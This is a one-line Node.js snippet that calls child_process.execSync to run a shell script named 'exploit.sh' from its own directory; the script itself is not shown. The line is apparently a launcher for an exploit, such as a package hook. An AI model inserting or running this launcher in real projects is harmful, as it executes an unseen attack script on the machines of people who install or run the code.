require('child_process').execSync('bash ' + require('path').join(__dirname, 'exploit.sh'), { stdio: 'inherit' });
